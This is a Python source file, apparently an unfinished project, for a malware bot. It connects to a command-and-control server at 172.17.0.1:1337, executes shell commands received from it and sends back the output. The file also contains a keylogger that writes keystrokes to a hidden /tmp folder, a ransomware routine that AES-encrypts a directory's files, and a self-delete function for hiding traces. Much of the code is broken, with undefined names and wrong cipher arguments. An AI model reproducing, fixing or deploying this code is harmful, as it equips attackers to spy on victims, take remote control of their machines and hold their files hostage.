#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ______
"""

try:
	import socket # Import socket for creating TCP connection.
	from subprocess import PIPE, run # Import subprocess to execute system commands.
	from os import devnull, remove, mkdir, path # Import devnull, mkdir, and remove from os module.
	from sys import exit # Import exit from sys to quit program when specified.
	from platform import system # Import system from platform to detect os.
	from pynput import keyboard # Import keyboard to perform keylogger operations.
	from threading import Timer # Import Timer to create thread that'll run every 20s.
	from Crypto.Cipher import AES # Use AES encryption to encrypt stuff.
except ImportError:
    exit(1)
    
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
#  CONSTANTS  #
FILENAME = __file__[2:]
IP = "172.17.0.1" # IP address to connect to.
PORT = 1337 # Port number to create socket with.
DIRECTORY = "/tmp/.folder" # Hidden folder to create for our keylogger.
KEY = "Where's the money?" # Encryption key... :)

global log

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def create_client_socket(ip_addr: str, port: int):
	"""This function creates a client socket to connect to 
		our command & control server.
		Arguments:
			ip_addr (str): The IP address of our C&C server.
			port (int): The port number of the C&C server to connect to.
		Returns:
			This function will return a socket object.
	"""
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock: # Initializing socket.
		ip_port = (IP, PORT) # Connect to server IP/Port.
		client_sock.connect(ip_port)
		initial_message = "OS=" + system() # Send IP address and OS information.
		client_sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
		return client_sock # Return the created client socket.
		
def self_delete(name: str):
	"""This function will be invoked when the C&C server enter's the
		keyword "self-destruct" and which will instruct the program to
		delete traces of itself.
		Arguments:
			name (str): The name of this file.
		Returns:
			None
	"""
	remove(name) # Delete the local file to remove traces of our presence 
	print("File Deleted") # Print a confirmation
	
def propagate(name: str):
	"""This function will create other instances of this file in 
		other directories on the victim's machines when the keyword
		"propogate" is used.
		Arguments:
			name (str): The name of this file.
		Returns:
			None
	"""

def auto_recon():
	"""This function will perform basic reconnaissance on the target machines.
		Arguments:
		Returns:

	"""

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

# Keylogger stuff-=-=-=-=-=-=-=-=-=-=-=-=-=-
def on_press(key):
	"""
	"""
	try:
		self.log += str(key.char)
	except AttributeError:
		if key == key.space:
			self.log += ' '
		elif key == key.enter: self.log += '\n'
		elif key == key.backspace: self.log += ''
		elif key == key.ctrl: self.log += ' ctrl+'
		elif key == key.tab: self.log += '\t'
		else:
			self.log += str(key)

def log_to_file():
	"""
	"""
	global log
	f = open(DIRECTORY + 'log.txt', 'a+')
	f.write(log)
	cycle = Timer(30, log_to_file)
	cycle.start()

def keylogger():
	"""This function will start a keylogger in the background and will save its
		contents to /tmp folder.
		Arguments:
		Returns:
	"""
	with keyboard.Listener(
		onpress=on_press) as capturer:
		try:
			mkdir(DIRECTORY) # Attempt to create hidden directory in temp folder.
			capturer.join()
		except OSError:
			pass

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

# Ransomware stuff-=-=-=-=-=-=-=-=-=-=-=-=-=
def encrypt_it(data: str):
	"""This function will encyrpt the data passed as an argument.
		Arguments:
			data (str): The contents of a file.
		Returns:
			Will return the encrypted form of the files contents.
	"""
	AES_obj = AES.new(KEY, AES.MODE_CBC, "You have been pawned.")
	return AES_obj.encrypt(data)

def decrypt_it(data: str):
	"""This function will decyrpt the data passed as an argument.
		Arguments:
			data (str): The contents of a file.
		Returns:
			Will return the decrypted form of the files contents.
	"""
	AES_obj = AES.new(KEY, data, AES.MODE_CBC, "You have been pawned.")
	return AES_obj.decrypt(data)

def ransomware(*request: str):
	"""This function will encrypt a folder, a file, or the entire volume on a computer.
		Arguments:
		Returns
	"""
	action, path = request
	for f in listdir(path):
		abs_path = path.join(f, path)
		with open(abs_path, 'r') as input_file:
			to_write = None
			with open(abs_path, 'w') as output_file:
				file_contents = input_file.read()
				if action == 'encrypt':
					to_write = encrypt_it(file_contents)
				else:
					to_write = decrypt_it(file_contents)
				output_file.write(to_write)


""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class WindowsBot:
	"""This class definition will contain the functions and commands
		that are specific to the Windows operating system.
	"""
	def __init__(self):
		pass

	def exec_windows_cmd(self, commnd: str):
		"""This function will execute Windows commands requested by the C&C.
			Argments:
				command (str): The command that will be executed on the victim's machine.
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(devnull, 'w') # Open devnull file to send stderr to.
		output = subprocess.run(cmd.split(), # Run command.
								stdout=PIPE, # Pipe command to store in variable.
								stderr=DEVNULL)	# Send standard error to devnull.
		return output

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.
			Arguments:
				None
			Returns:
				None
		"""
		sock = create_client_socket(self.ip_addr) # Store socket object.
		command = sock.recv(1024).decode('utf-8') # Receive command from server.
		while command != 'quit': # Check if the user has asked to quit the program.
			command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
			sock.send(command_output) # Send the output to the C&C server.
		
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class LinuxBot:
	"""This class definition will contain the functions and commands
		that are specific to the Linux operating system.
	"""
	def __init__(self):
	    self.ip_addr = "172.17.0.1"

	def exec_linux_cmd(self, commnd: str):
		"""This function will execute Linux commands requested by the C&C.
			Argments:
				command (str): The command that will be executed on the victim's machine.
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(devnull, 'w') # Open devnull file to send stderr to.
		output = subprocess.run(cmd.split(), # Run command.
								stdout=PIPE, # Pipe command to store in variable.
								stderr=DEVNULL)	# Send standard error to devnull.

		return output

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.
			Arguments:
				None
			Returns:
				None
		"""
		sock = create_client_socket() # Store socket object.
		command = sock.recv(1024).decode('utf-8') # Receive command from server.
		command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
		sock.send(command_output) # Send the output to the C&C server.

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
	obj = None
	OS = system() # Determine operating system.
	if OS == "Linux": # Check if operating system is Linux.
		obj = LinuxBot() # If Linux, instantiate LinuxBot object.
	else:
		obj = WindowsBot() # Else, instantiate WindowsBot object.

if __name__ == '__main__':
    main()